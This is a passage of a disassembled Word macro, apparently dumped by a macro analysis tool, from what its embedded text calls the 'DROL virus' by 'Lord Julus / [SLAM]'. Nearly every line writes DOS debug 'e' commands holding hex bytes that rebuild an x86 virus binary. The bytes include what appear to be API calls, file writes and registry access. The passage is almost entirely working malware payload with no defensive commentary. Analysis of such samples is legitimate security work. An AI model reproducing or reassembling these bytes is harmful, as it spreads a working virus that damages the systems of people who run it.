' 	LitStr 0x0037 "e 1590 18 5b 89 5e 10 8b 46 38 05 d9 14 00 00 8b 8d 87 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #336:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 15a0 17 40 00 50 51 33 d2 f7 f1 59 2b ca 58 03 c1 89 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #337:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 15b0 46 38 8b 9d a8 17 40 00 8d 76 60 b9 10 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #338:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 15c0 ad 3b d8 75 0b 8b 85 ac 17 40 00 89 46 fc eb 03 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #339:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 15d0 ad e2 ed 8b b5 75 17 40 00 66 c7 46 12 52 44 66 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #340:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 15e0 c7 85 79 17 40 00 00 00 eb 09 66 c7 85 79 17 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #341:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 15f0 00 ff 00 ff b5 75 17 40 00 ff 95 b1 11 40 00 ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #342:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1600 b5 45 17 40 00 ff 95 c5 11 40 00 6a 00 6a 00 ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #343:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1610 b5 71 17 40 00 ff b5 49 17 40 00 ff 95 d1 11 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #344:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1620 00 ff b5 49 17 40 00 ff 95 d9 11 40 00 bb 59 17 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #345:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1630 40 00 03 dd 53 83 c3 08 53 83 c3 08 53 ff b5 49 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #346:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1640 17 40 00 ff 95 cd 11 40 00 ff b5 49 17 40 00 ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #347:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1650 95 c5 11 40 00 ff b5 51 17 40 00 ff b5 55 17 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #348:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1660 00 ff 95 b9 11 40 00 eb 03 f9 eb 0c 66 81 bd 79 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #349:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1670 17 40 00 ff 00 74 f2 f8 61 c3 60 8d 85 92 13 40 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #350:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1680 00 50 ff 95 e1 11 40 00 83 f8 00 0f 84 85 01 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #351:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1690 00 89 85 9c 13 40 00 8d 85 31 12 40 00 50 8b 85 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #352:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 16a0 9c 13 40 00 50 ff 95 95 11 40 00 83 f8 00 0f 84 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #353:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 16b0 62 01 00 00 8b d8 8d 85 8f 17 40 00 8b f8 50 ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #354:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 16c0 95 dd 11 40 00 8b 47 04 25 00 00 ff ff c1 e8 10 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #355:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 16d0 83 f8 07 0f 85 3d 01 00 00 68 30 10 00 00 8d 85 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #356:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 16e0 18 21 40 00 50 8d 85 44 21 40 00 50 6a 00 ff d3 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #357:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 16f0 8d 85 fd 11 40 00 50 ff 95 e1 11 40 00 83 f8 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #358:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1700 0f 84 10 01 00 00 8b d8 8d 85 0a 12 40 00 50 53 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #359:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1710 ff 95 95 11 40 00 83 f8 00 0f 84 f7 00 00 00 89 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #360:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1720 85 29 12 40 00 8d 85 1a 12 40 00 50 53 ff 95 95 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #361:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1730 11 40 00 83 f8 00 0f 84 da 00 00 00 89 85 2d 12 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #362:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1740 40 00 68 80 00 00 00 8d 85 a2 21 40 00 50 ff 95 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #363:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1750 e9 11 40 00 8d bd a2 21 40 00 b0 00 b9 80 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #364:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1760 00 f2 ae c6 47 ff 5c 8d b5 a6 22 40 00 b9 09 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #365:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1770 00 00 f3 a4 8d b5 a2 21 40 00 6a 00 6a 00 6a 02 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #366:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1780 6a 00 6a 01 68 00 00 00 c0 56 ff 95 c1 11 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #367:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1790 89 85 49 17 40 00 83 f8 ff 74 7b 6a 00 8d 85 f5 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #368:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 17a0 23 40 00 50 68 46 01 00 00 8d 85 af 22 40 00 50 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #369:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 17b0 ff b5 49 17 40 00 ff 95 f9 11 40 00 ff b5 49 17 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #370:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 17c0 40 00 ff 95 c5 11 40 00 8d 85 f9 23 40 00 50 8d "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #371:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 17d0 85 fd 23 40 00 50 6a 00 68 3f 00 0f 00 6a 00 6a "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #372:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 17e0 00 6a 00 8d 85 01 24 40 00 50 68 01 00 00 80 ff "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #373:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 17f0 95 29 12 40 00 6a 19 8d 85 a2 21 40 00 50 6a 01 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #374:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1800 6a 00 8d 85 17 24 40 00 50 8b 85 fd 23 40 00 50 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #375:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1810 ff 95 2d 12 40 00 61 c3 44 52 4f 4c 20 76 31 2e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #376:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1820 30 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #377:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1830 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #378:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1840 20 20 20 00 0d 0a 0d 0a 54 68 69 73 20 69 73 20 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #379:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1850 74 68 65 20 44 52 4f 4c 20 76 69 72 75 73 0d 0a "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #380:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1860 0d 0a 63 6f 70 79 72 69 67 68 74 20 28 43 29 20 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #381:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1870 4c 6f 72 64 20 4a 75 6c 75 73 20 2f 20 5b 53 4c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #382:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1880 41 4d 5d 0d 0a 0d 0a 77 72 69 74 74 65 6e 20 66 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #383:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1890 6f 72 20 66 75 6e 2e 2e 2e 20 3b 2d 29 0d 0a 0d "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #384:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 18a0 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #385:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 18b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #386:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 18c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #387:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 18d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #388:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 18e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #389:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
